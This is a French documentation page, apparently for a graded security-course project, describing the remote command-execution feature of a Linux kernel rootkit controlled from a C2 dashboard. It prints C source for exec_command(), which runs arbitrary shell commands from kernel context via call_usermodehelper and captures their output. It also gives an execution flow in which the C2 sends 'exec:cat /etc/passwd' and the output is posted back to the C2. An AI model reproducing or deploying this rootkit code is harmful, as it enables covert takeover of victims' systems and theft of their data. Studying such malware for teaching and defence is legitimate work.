---
title: Exécution de commandes
description: Exécuter des commandes shell arbitraires sur la victime depuis le tableau de bord C2. stdout, stderr et le code de retour sont renvoyés.
---

**Obligatoire · 5 pts**

Exécuter des commandes shell arbitraires sur la victime depuis le tableau de bord C2. `stdout`, `stderr` et le code de retour sont renvoyés.

## Fonctionnement

Quand le C2 envoie une action `exec:<cmd>`, le rootkit appelle `exec_command()` qui utilise `call_usermodehelper()` — l'API noyau pour démarrer des processus userland depuis le contexte noyau. La commande est encapsulée dans un one-liner shell qui redirige la sortie vers des fichiers temporaires dans `/rootkit/`, puisque les threads noyau n'ont pas accès à stdio.

Après la fin du shell (`UMH_WAIT_PROC`), le rootkit lit stdout, stderr et le code de retour depuis les fichiers temporaires, puis les poste tous les trois à `/api/<uuid>/result`.

## Implémentation

```c
// rootkit/src/exec.c : exec_command()

int exec_command(const char *cmd, char *stdout_buf, ..., int *exit_code)
{
    // Construction : cmd >stdout 2>stderr; echo $? >exitcode
    snprintf(sh_cmd, 4096,
             "%s > /rootkit/stdout 2> /rootkit/stderr"
             " ; echo $? > /rootkit/exitcode", cmd);

    char *argv[] = { "/bin/sh", "-c", sh_cmd, NULL };
    char *envp[] = { "HOME=/",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    sub_info = call_usermodehelper_setup(argv[0], argv, envp,
                                         GFP_KERNEL, NULL, NULL, NULL);

    // UMH_WAIT_PROC : bloque le kthread jusqu'à la fin de /bin/sh
    call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);

    // Lecture des résultats depuis les fichiers temporaires
    read_file("/rootkit/exitcode", exitcode_buf, sizeof(exitcode_buf));
    *exit_code = simple_strtol(exitcode_buf, NULL, 10);
    read_file("/rootkit/stdout",   stdout_buf, stdout_max);
    read_file("/rootkit/stderr",   stderr_buf, stderr_max);
}
```

:::tip[Pourquoi des fichiers temporaires ?]
Les threads noyau n'ont pas de descripteurs de fichiers et pas d'accès à stdio. `call_usermodehelper()` exécute le processus sans terminal attaché. La redirection via des fichiers dans `/rootkit/` est le pattern standard pour capturer la sortie d'un sous-processus depuis l'espace noyau.
:::

## Flux d'exécution

1. Le C2 envoie `200 OK` avec le corps `exec:cat /etc/passwd`
2. Le rootkit construit : `cat /etc/passwd > /rootkit/stdout 2> /rootkit/stderr; echo $? > /rootkit/exitcode`
3. `call_usermodehelper("/bin/sh", UMH_WAIT_PROC)` — bloque jusqu'à la fin du shell
4. Le rootkit lit les trois fichiers temporaires
5. `POST /api/<uuid>/result` avec `exit_code`, `stdout`, `stderr`
6. Le résultat s'affiche dans le tableau de bord C2
